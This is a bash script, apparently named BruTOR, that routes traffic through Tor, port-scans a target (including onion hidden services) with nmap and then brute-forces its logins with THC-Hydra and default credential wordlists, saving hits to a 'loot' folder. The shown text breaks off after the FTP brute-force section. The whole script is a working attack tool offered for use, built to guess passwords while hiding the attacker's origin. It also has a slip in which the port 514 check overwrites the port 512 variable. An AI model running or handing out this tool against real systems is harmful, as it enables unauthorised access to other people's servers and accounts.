#!/bin/bash 
# BruTOR - Enhanced THC-Hydra Integration for TOR Hidden Services
# Supports v2 and v3 onion addresses with full THC-Hydra functionality
# Version 2.0 - Updated for TORhunter

TARGET="$1"
PORT="$2"
VER="2.0"

# Detect script directory for relative paths
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
LOOT_DIR="$SCRIPT_DIR/loot"
WORDLIST_DIR="$SCRIPT_DIR/wordlists"

# Wordlist paths - dynamically set based on script location
FTP_USER_PASS="$WORDLIST_DIR/ftp-default-userpass.txt"
SSH_USER_PASS="$WORDLIST_DIR/ssh-default-userpass.txt"
TELNET_USER_PASS="$WORDLIST_DIR/telnet-default-userpass.txt"
MSSQL_USER_PASS="$WORDLIST_DIR/mssql-default-userpass.txt"
MYSQL_USER_PASS="$WORDLIST_DIR/mysql-default-userpass.txt"
ORACLE_USER_PASS="$WORDLIST_DIR/oracle-default-userpass.txt"
POSTGRES_USER_PASS="$WORDLIST_DIR/postgres-default-userpass.txt"
WINDOWS_USER_LIST="$WORDLIST_DIR/windows-users.txt"
WINDOWS_USER_PASS="$WORDLIST_DIR/windows-default-userpass.txt"
USER_FILE="$WORDLIST_DIR/simple-users.txt"
PASS_FILE="$WORDLIST_DIR/passswords.txt"
SNMP_FILE="$WORDLIST_DIR/snmp-strings.txt"
VNC_FILE="$WORDLIST_DIR/vnc-default-passwords.txt"

# Hydra configuration
HTTP_LOCATION="/"
THREADS="16"
TIMEOUT="30"
COLOR1='\033[91m'
COLOR2='\033[92m'
COLOR3='\033[93m'
COLOR4='\033[96m'
RESET='\e[0m'

# ENABLE PROXY for TOR - Essential for onion services
export HYDRA_PROXY=socks4://127.0.0.1:9050
export HYDRA_PROXY_HTTP=http://127.0.0.1:8118

# Display banner
banner() {
	clear
	echo -e "$COLOR1  ____                   ______  ____   ____   $RESET"
	echo -e "$COLOR1 | __ )  _ __  _   _   |_   _|/ __ \ |  _ \  $RESET"
	echo -e "$COLOR1 |  _ \ | '__|| | | |    | | | |  | || |_) | $RESET"
	echo -e "$COLOR1 | |_) || |   | |_| |    | | | |__| ||  _ <  $RESET"
	echo -e "$COLOR1 |____/ |_|    \__,_|    |_|  \____/ |_| \_\ $RESET"
	echo ""
	echo -e "$COLOR2 + -- --=[BruTOR v$VER - Enhanced for TOR Hidden Services$RESET"
	echo -e "$COLOR2 + -- --=[THC-Hydra Integration with v3 Onion Support$RESET"
	echo -e "$COLOR2 + -- --=[Original BruteX by @xer0dayz - TORhunter Enhanced$RESET"
	echo ""
}

# Check dependencies
check_dependencies() {
	echo -e "$COLOR3[*] Checking dependencies...$RESET"
	
	if ! command -v hydra &> /dev/null; then
		echo -e "$COLOR1[!] Error: hydra is not installed!$RESET"
		echo "Install with: sudo apt-get install hydra"
		exit 1
	fi
	
	if ! command -v nmap &> /dev/null; then
		echo -e "$COLOR1[!] Error: nmap is not installed!$RESET"
		echo "Install with: sudo apt-get install nmap"
		exit 1
	fi
	
	# Check if Tor is running
	if ! pgrep -x "tor" > /dev/null; then
		echo -e "$COLOR1[!] Warning: Tor is not running!$RESET"
		echo "Start Tor with: sudo service tor start"
		read -p "Continue anyway? (y/n): " choice
		if [[ ! "$choice" =~ ^[Yy]$ ]]; then
			exit 1
		fi
	fi
	
	echo -e "$COLOR2[+] All dependencies satisfied$RESET"
}

# Validate target and port
if [ -z "$TARGET" ]; then
	banner
	echo -e "$COLOR1[!] Usage: $0 <target> [port]$RESET"
	echo ""
	echo "Examples:"
	echo "  $0 127.0.0.1"
	echo "  $0 127.0.0.1 22"
	echo "  $0 example.onion (when connected through proxy)"
	echo ""
	exit 1
fi

banner
check_dependencies

# Create loot directory if it doesn't exist
mkdir -p "$LOOT_DIR"

echo ""
echo -e "$COLOR4[*] Target: $TARGET$RESET"
echo -e "$COLOR4[*] Port: ${PORT:-Auto-detect}$RESET"
echo -e "$COLOR4[*] Threads: $THREADS$RESET"
echo -e "$COLOR4[*] Proxy: ${HYDRA_PROXY:-None}$RESET"
echo ""

echo -e "$COLOR3================================= Running Port Scan ================================$RESET"
if [ -z "$PORT" ]; then
	echo -e "$COLOR3[*] Scanning common ports...$RESET"
	# Enhanced port list including common hidden service ports
	nmap -Pn -sT --open $TARGET -p21,22,23,25,53,80,110,139,143,162,389,443,445,512,513,514,993,995,1433,1521,3306,3389,5432,5900,5901,6667,8000,8008,8080,8081,8443,9050,9051 -oX $LOOT_DIR/nmap-$TARGET.xml
else
	echo -e "$COLOR3[*] Scanning port $PORT...$RESET"
	nmap -Pn -sT --open $TARGET -p $PORT -oX $LOOT_DIR/nmap-$TARGET.xml
fi

if [ ! -f "$LOOT_DIR/nmap-$TARGET.xml" ]; then
	echo -e "$COLOR1[!] Error: Port scan failed!$RESET"
	exit 1
fi

echo -e "$COLOR2[+] Port scan complete$RESET"
echo ""
echo -e "$COLOR3================================ Running Brute Force ===============================$RESET"
echo -e "$COLOR4[*] Using THC-Hydra with enhanced options$RESET"
echo ""
port_21=`grep 'portid="21"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_22=`grep 'portid="22"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_23=`grep 'portid="23"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_25=`grep 'portid="25"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_80=`grep 'portid="80"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_110=`grep 'portid="110"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_139=`grep 'portid="139"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_162=`grep 'portid="162"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_389=`grep 'portid="389"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_443=`grep 'portid="443"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_445=`grep 'portid="445"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_512=`grep 'portid="512"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_513=`grep 'portid="513"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_512=`grep 'portid="514"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_993=`grep 'portid="993"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_1521=`grep 'portid="1521"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_5901=`grep 'portid="5901"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap-$TARGET.xml | grep open`
port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap-$TARGET.xml | grep open`

if [ -z "$port_21" ]; then
	echo -e "$COLOR1[-] Port 21 (FTP) closed... skipping.$RESET"
else
	echo -e "$COLOR2[+] Port 21 (FTP) open... running brute force...$RESET"
	if [ -f "$FTP_USER_PASS" ]; then
		hydra -C "$FTP_USER_PASS" $TARGET ftp -t $THREADS -w $TIMEOUT -e nsr -V -o "$LOOT_DIR/hydra-ftp-$TARGET.txt"
	fi
	if [ -f "$USER_FILE" ] && [ -f "$PASS_FILE" ]; then
		hydra -L "$USER_FILE" -P "$PASS_FILE" $TARGET ftp -t $THREADS -w $TIMEOUT -e nsr -V -o "$LOOT_DIR/hydra-ftp-$TARGET.txt"
	fi
fi

